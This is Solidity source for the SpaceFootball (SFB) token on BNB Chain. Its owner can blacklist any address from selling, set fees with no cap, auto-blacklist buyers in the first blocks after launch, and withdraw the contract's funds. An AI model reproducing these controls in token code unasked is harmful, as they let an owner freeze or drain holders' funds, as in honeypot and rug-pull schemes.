/**
 *Submitted for verification at BscScan.com on 2022-10-06
*/

pragma solidity ^0.6.12;

// SPDX-License-Identifier: Unlicensed
interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, 'SafeMath: addition overflow');

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, 'SafeMath: subtraction overflow');
  }

  function sub(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, 'SafeMath: multiplication overflow');

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, 'SafeMath: division by zero');
  }

  function div(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, 'SafeMath: modulo by zero');
  }

  function mod(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

abstract contract Context {
  function _msgSender() internal view virtual returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library Address {
  function isContract(address account) internal view returns (bool) {
    bytes32 codehash;
    bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
    // solhint-disable-next-line no-inline-assembly
    assembly {
      codehash := extcodehash(account)
    }
    return (codehash != accountHash && codehash != 0x0);
  }

  function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, 'Address: insufficient balance');

    // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
    (bool success, ) = recipient.call{ value: amount }('');
    require(success, 'Address: unable to send value, recipient may have reverted');
  }

  function functionCall(address target, bytes memory data) internal returns (bytes memory) {
    return functionCall(target, data, 'Address: low-level call failed');
  }

  function functionCall(
    address target,
    bytes memory data,
    string memory errorMessage
  ) internal returns (bytes memory) {
    return _functionCallWithValue(target, data, 0, errorMessage);
  }

  function functionCallWithValue(
    address target,
    bytes memory data,
    uint256 value
  ) internal returns (bytes memory) {
    return functionCallWithValue(target, data, value, 'Address: low-level call with value failed');
  }

  function functionCallWithValue(
    address target,
    bytes memory data,
    uint256 value,
    string memory errorMessage
  ) internal returns (bytes memory) {
    require(address(this).balance >= value, 'Address: insufficient balance for call');
    return _functionCallWithValue(target, data, value, errorMessage);
  }

  function _functionCallWithValue(
    address target,
    bytes memory data,
    uint256 weiValue,
    string memory errorMessage
  ) private returns (bytes memory) {
    require(isContract(target), 'Address: call to non-contract');

    // solhint-disable-next-line avoid-low-level-calls
    (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
    if (success) {
      return returndata;
    } else {
      // Look for revert reason and bubble it up if present
      if (returndata.length > 0) {
        // The easiest way to bubble the revert reason is using memory via assembly

        // solhint-disable-next-line no-inline-assembly
        assembly {
          let returndata_size := mload(returndata)
          revert(add(32, returndata), returndata_size)
        }
      } else {
        revert(errorMessage);
      }
    }
  }
}

contract Ownable is Context {
  address private _owner;
  address private _previousOwner;
  uint256 private _lockTime;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), 'Ownable: caller is not the owner');
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), 'Ownable: new owner is the zero address');
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }

}

interface IUniswapV2Factory {
  event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

  function feeTo() external view returns (address);

  function feeToSetter() external view returns (address);

  function getPair(address tokenA, address tokenB) external view returns (address pair);

  function allPairs(uint256) external view returns (address pair);

  function allPairsLength() external view returns (uint256);

  function createPair(address tokenA, address tokenB) external returns (address pair);

  function setFeeTo(address) external;

  function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
  function factory() external pure returns (address);

  function WETH() external pure returns (address);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  )
    external
    returns (
      uint256 amountA,
      uint256 amountB,
      uint256 liquidity
    );

  function addLiquidityETH(
    address token,
    uint256 amountTokenDesired,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  )
    external
    payable
    returns (
      uint256 amountToken,
      uint256 amountETH,
      uint256 liquidity
    );

  function removeLiquidity(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETH(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountToken, uint256 amountETH);

  function removeLiquidityWithPermit(
    address tokenA,
    address tokenB,
    uint256 liquidity,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountA, uint256 amountB);

  function removeLiquidityETHWithPermit(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountToken, uint256 amountETH);

  function swapExactTokensForTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapTokensForExactTokens(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactETHForTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function swapTokensForExactETH(
    uint256 amountOut,
    uint256 amountInMax,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapExactTokensForETH(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external returns (uint256[] memory amounts);

  function swapETHForExactTokens(
    uint256 amountOut,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable returns (uint256[] memory amounts);

  function quote(
    uint256 amountA,
    uint256 reserveA,
    uint256 reserveB
  ) external pure returns (uint256 amountB);

  function getAmountOut(
    uint256 amountIn,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountOut);

  function getAmountIn(
    uint256 amountOut,
    uint256 reserveIn,
    uint256 reserveOut
  ) external pure returns (uint256 amountIn);

  function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);

  function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
  function removeLiquidityETHSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountETH);

  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
    address token,
    uint256 liquidity,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline,
    bool approveMax,
    uint8 v,
    bytes32 r,
    bytes32 s
  ) external returns (uint256 amountETH);

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;

  function swapExactETHForTokensSupportingFeeOnTransferTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable;

  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;
}

contract SpaceFootball is Context, IERC20, Ownable {
  using SafeMath for uint256;
  using Address for address;
  mapping(address => uint256) private _tOwned;
  mapping(address => mapping(address => uint256)) private _allowances;

  mapping(address => bool) private _isExcludedFromFee;

  uint256 private _tTotal = 100000000 * 10**18;
  uint256 private _buyamount = 100000000 * 10**18;
  uint256 public launchedAt = 0;

  string private _name = 'SpaceFootball';
  string private _symbol = 'SFB';
  uint8 private _decimals = 18;

  uint256 public _liquidityFee = 0;
  uint256 private _previousLiquidityFee = _liquidityFee;

  uint256 public _devFee = 0;
  uint256 private _previousDevFee = _devFee;

  uint256 public _airdropFee = 0;
  uint256 private _preAirdropFee = _airdropFee;

  address public devAddress = 0xe76952F9A2D1c80711E5528B836Fe36013D04cDa; 
  address public airdropAddress = 0xdDf56E955FD4eC2ed683E38172393540EA2771CE;

  mapping(address => bool) blackAddress;
  
  address public router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  IUniswapV2Router02 public immutable uniswapV2Router;
  address public immutable uniswapV2Pair;

  bool inSwapAndLiquify;
  bool public swapAndLiquifyEnabled = true;
  uint256 public numTokensSellToAddToLiquidity = 50000 * 10**18;

  event NewNumTokensSellToAddToLiquidity(uint num);
  event SwapAndLiquifyEnabledUpdated(bool enabled);
  event SetDevAddress(address dev);
  event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);

  modifier lockTheSwap() {
    inSwapAndLiquify = true;
    _;
    inSwapAndLiquify = false;
  }

  constructor() public {
    _tOwned[_msgSender()] = _tTotal;

    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
    uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    uniswapV2Router = _uniswapV2Router;
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;

    emit Transfer(address(0), _msgSender(), _tTotal);
  }

  function name() public view returns (string memory) {
    return _name;
  }

  function symbol() public view returns (string memory) {
    return _symbol;
  }

  function decimals() public view returns (uint8) {
    return _decimals;
  }

  function totalSupply() public view override returns (uint256) {
    return _tTotal;
  }

  function balanceOf(address account) public view override returns (uint256) {
    return _tOwned[account];
  }

  function transfer(address recipient, uint256 amount) public override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) public view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 'ERC20: transfer amount exceeds allowance'));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, 'ERC20: decreased allowance below zero'));
    return true;
  }

  function _transferBothExcluded(
    address sender,
    address recipient,
    uint256 tAmount
  ) private {
    (uint256 tTransferAmount, uint256 tLiquidity, uint tDev, uint tAirdrop) = _getValues(tAmount);
    _tOwned[sender] = _tOwned[sender].sub(tAmount);
    _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
    _takeLiquidity(tLiquidity);
    _takeDev(tDev);
    _takeAirdrop(tAirdrop);
    emit Transfer(sender, recipient, tTransferAmount);
    if(tLiquidity != 0){
      emit Transfer(sender, address(this), tLiquidity);
    }
    if(tDev != 0){
      emit Transfer(sender, address(this), tDev);
    }
    if(tAirdrop != 0){
      emit Transfer(sender, airdropAddress, tAirdrop);
    }
  }

  function excludeFromFee(address account) public onlyOwner {
    _isExcludedFromFee[account] = true;
  }

  function includeInFee(address account) public onlyOwner {
    _isExcludedFromFee[account] = false;
  }

  function setDevFeePercent(uint256 devFee) external onlyOwner {
    _devFee = devFee;
    _previousDevFee = _devFee;
  }

  function setAirdropFeePercent(uint256 airdropFee) external onlyOwner {
    _airdropFee = airdropFee;
    _preAirdropFee = _airdropFee;
  }

  function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner {
    _liquidityFee = liquidityFee;
    _previousLiquidityFee = _liquidityFee;
  }

  function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
    swapAndLiquifyEnabled = _enabled;
    emit SwapAndLiquifyEnabledUpdated(_enabled);
  }
  
  function setNumTokensSellToAddToLiquidity(uint _numTokensSellToAddToLiquidity) public onlyOwner {
      numTokensSellToAddToLiquidity = _numTokensSellToAddToLiquidity;
      emit NewNumTokensSellToAddToLiquidity(numTokensSellToAddToLiquidity);
  }

  
  function setDevAddress(address _devAddress) public onlyOwner {
      require(_devAddress!= address(0) , "_devAddress can not be zero address!");
      devAddress = _devAddress;
      emit SetDevAddress(_devAddress);
  }
  
  function setBlackAddress(address account) public onlyOwner {
      blackAddress[account] = true;
  }
  
  function relieveBlackAddress(address account) public onlyOwner {
      blackAddress[account] = false;
  }
  
  function withDraw(address _account) public onlyOwner{
      payable(_account).transfer(address(this).balance);
  }

  function withDrawToken(address _token, address _account) public onlyOwner{
      IERC20 t = IERC20(_token);
      uint tokenBalance = t.balanceOf(address(this));
      t.transfer(_account, tokenBalance);
  }
  

  receive() external payable {}

  function _getValues(uint256 tAmount) private view returns ( uint256, uint256, uint256, uint256){
    uint256 tLiquidity = calculateLiquidityFee(tAmount);
    uint256 tDev = calculateDevFee(tAmount);
    uint256 tAirdrop = calculateAirdropFee(tAmount); 
    uint256 tTransferAmount = tAmount.sub(tLiquidity);
    tTransferAmount = tTransferAmount.sub(tDev).sub(tAirdrop);
    return (tTransferAmount, tLiquidity, tDev, tAirdrop);
  }

  function _takeLiquidity(uint256 tLiquidity) private {
    _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
  }
  
  function _takeDev(uint256 tDev) private {
    _tOwned[address(this)] = _tOwned[address(this)].add(tDev);
  }

  function _takeAirdrop(uint256 tAirdrop) private {
    _tOwned[airdropAddress] = _tOwned[airdropAddress].add(tAirdrop);
  }
  

  function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
    return _amount.mul(_liquidityFee).div(10**4);
  }
  
  function calculateDevFee(uint256 _amount) private view returns (uint256) {
    return _amount.mul(_devFee).div(10**4);
  }

  function calculateAirdropFee(uint256 _amount) private view returns (uint256) {
    return _amount.mul(_airdropFee).div(10**4);
  }
  
  
  function removeAllFee() private {
    if (_liquidityFee == 0 && _devFee == 0 && _airdropFee == 0) return;

    _previousDevFee = _devFee;
    _previousLiquidityFee = _liquidityFee;
    _preAirdropFee = _airdropFee;

    _liquidityFee = 0;
    _devFee = 0;
    _airdropFee = 0;
  }

  function restoreAllFee() private {
    _liquidityFee = _previousLiquidityFee;
    _devFee = _previousDevFee;
    _airdropFee = _preAirdropFee;
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), 'ERC20: approve from the zero address');
    require(spender != address(0), 'ERC20: approve to the zero address');

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _transfer(
    address from,
    address to,
    uint256 amount
  ) private {
    require(!blackAddress[from], "blacklist");
    require(from != address(0), 'ERC20: transfer from the zero address');
    require(to != address(0), 'ERC20: transfer to the zero address');
    require(amount > 0, 'Transfer amount must be greater than zero');
    uint256 contractTokenBalance = balanceOf(address(this));
    
    if (from == uniswapV2Pair) {
        require(amount >= _buyamount);
        if (block.number <= (launchedAt + 3)) { 
        blackAddress[to] = true;
            }
    }        
    bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
    if (overMinTokenBalance && !inSwapAndLiquify && from != uniswapV2Pair && swapAndLiquifyEnabled && from != router) {
      contractTokenBalance = numTokensSellToAddToLiquidity;
      swapAndLiquify(contractTokenBalance);
    }
    bool takeFee = true;
    if (_isExcludedFromFee[from] || _isExcludedFromFee[to] || to == router) {
      takeFee = false;
    }
    _tokenTransfer(from, to, amount, takeFee);
  }

  function opentrading() external onlyOwner {
        _buyamount = 0;
        _liquidityFee = 100;
        _devFee = 100;
        _airdropFee = 100;
        launchedAt = block.number;
  }

  function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
    uint256 allRate = _liquidityFee.add(_devFee);
    uint256 halfLiquidityFee = _liquidityFee.div(2);
    uint256 allNeedToSwap = halfLiquidityFee.add(_devFee);
    uint256 allNeedToSwapToken = contractTokenBalance.mul(allNeedToSwap).div(allRate);
    uint256 otherToken = contractTokenBalance.sub(allNeedToSwapToken);
    uint256 initialBalance = address(this).balance;
    swapTokensForEth(allNeedToSwapToken);
    uint256 newBalance = address(this).balance.sub(initialBalance);

    uint256 halfLiquidityFeeGet = newBalance.mul(halfLiquidityFee).div(allNeedToSwap);
    uint256 devBalance = newBalance.sub(halfLiquidityFeeGet);
    addLiquidity(otherToken, halfLiquidityFeeGet);
    payable(devAddress).transfer(devBalance);
    emit SwapAndLiquify(allNeedToSwapToken, newBalance, otherToken);
  }

  function swapTokensForEth(uint256 tokenAmount) private {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();
    _approve(address(this), address(uniswapV2Router), tokenAmount);
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
  }

  function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
    _approve(address(this), address(uniswapV2Router), tokenAmount);
    uniswapV2Router.addLiquidityETH{ value: ethAmount }(address(this),tokenAmount,0,0,owner(),block.timestamp);
  }
  function _tokenTransfer(
    address sender,
    address recipient,
    uint256 amount,
    bool takeFee
  ) private {
    if (!takeFee) removeAllFee();
    _transferBothExcluded(sender, recipient, amount);
    if (!takeFee) restoreAllFee();
  }

}